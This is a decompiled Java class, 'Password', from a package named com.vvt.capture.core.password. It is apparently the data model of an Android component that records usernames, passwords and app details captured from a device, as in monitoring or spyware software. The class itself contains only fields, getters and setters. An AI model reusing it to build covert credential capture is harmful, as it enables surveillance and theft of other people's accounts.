package com.vvt.capture.core.password;

import java.io.Serializable;

public class Password
  implements Serializable
{
  private static final long serialVersionUID = -9060390626061606863L;
  private String accountName;
  private String appId;
  private String appName;
  private AppType appType;
  private long eventTime;
  private String password;
  private String username;
  
  public String getAccountName()
  {
    return this.accountName;
  }
  
  public String getAppId()
  {
    return this.appId;
  }
  
  public String getAppName()
  {
    return this.appName;
  }
  
  public AppType getAppType()
  {
    return this.appType;
  }
  
  public long getEventTime()
  {
    return this.eventTime;
  }
  
  public String getPassword()
  {
    return this.password;
  }
  
  public String getUsername()
  {
    return this.username;
  }
  
  public void setAccountName(String paramString)
  {
    this.accountName = paramString;
  }
  
  public void setAppId(String paramString)
  {
    this.appId = paramString;
  }
  
  public void setAppName(String paramString)
  {
    this.appName = paramString;
  }
  
  public void setAppType(AppType paramAppType)
  {
    this.appType = paramAppType;
  }
  
  public void setEventTime(long paramLong)
  {
    this.eventTime = paramLong;
  }
  
  public void setPassword(String paramString)
  {
    this.password = paramString;
  }
  
  public void setUsername(String paramString)
  {
    this.username = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/core/password/Password.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */